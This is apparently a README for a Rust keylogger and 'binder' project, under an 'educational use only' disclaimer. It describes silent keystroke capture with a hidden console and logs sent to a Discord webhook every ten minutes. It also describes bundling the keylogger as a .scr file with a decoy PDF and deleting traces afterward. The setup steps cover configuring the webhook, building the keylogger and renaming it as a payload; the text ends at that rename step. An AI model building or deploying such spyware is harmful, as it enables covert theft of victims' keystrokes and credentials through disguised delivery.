# 🦀 Rust Keylogger & Binder (Educational Use Only)

> 🚨 **DISCLAIMER**: This project is for **educational and ethical hacking training only**. It is intended to help red teamers, blue teamers, and cybersecurity learners understand the mechanics of keyloggers and stealth payload delivery techniques. **Do not run this on any system you do not own or have explicit permission to test. Always use isolated virtual machines or lab environments.**

---

## 📚 Overview

This repository contains a complete **Rust-based keylogger** and a **stealth delivery binder** simulating a real-world attack scenario. The purpose is to demonstrate how a seemingly harmless file (like a PDF) can be used to drop and execute a keylogger in the background.

The project is split into two components:

1. **Keylogger (`main.rs`)**

   - Captures keystrokes silently.
   - Sends logs to a Discord webhook every 10 minutes.
   - Hides its console window.
   - Designed to simulate persistent, low-noise keylogging behavior.

2. **Binder (`binder.rs`)**
   - Bundles the compiled keylogger with a decoy PDF file.
   - Executes both: the real PDF (decoy) and the keylogger (.scr).
   - Deletes temporary files after execution to reduce footprint.

---

## 📂 Project Structure

Keylogger/
├── src/
│ ├── main.rs # Main keylogger logic
│ └── bin/
│ └── binder.rs # PDF + SCR binder
├── assets/
│ ├── resume.pdf # Decoy PDF
│ └── win_payload.scr # Keylogger executable (renamed)
├── config/
│ └── webhook.url # Your Discord webhook URL (plaintext)
├── Cargo.toml
├── README.md
└── target/ # Cargo build output

---

## ⚙️ Requirements

- Rust (latest stable recommended) → [Install Rust](https://www.rust-lang.org/tools/install)
- Windows machine or VM
- Discord account for receiving webhook logs
- PDF file to use as decoy (already provided, named `sample.pdf` , in `assets` directory)

---

## 🔧 Setup & Compilation

### 1. Clone the Repo

```bash
git clone https://github.com/yourusername/rust-keylogger.git
cd rust-keylogger
```

### 2. Set Up Your Webhook

Inside the config/webhook.url directory, replace your webhook address (ex , Discord , Telegram , ...):

```bash
  https://discordapp.com/api/webhooks/<YOUR_DISCORD_API>
```

The Rust code reads this file at compile time using:

### 3. Compile the Keylogger Binary

```bash
cargo build --release --bin keylogger
```

Rename the resulting file:

```bash
mv target/release/keylogger.exe assets/win_payload.scr
```
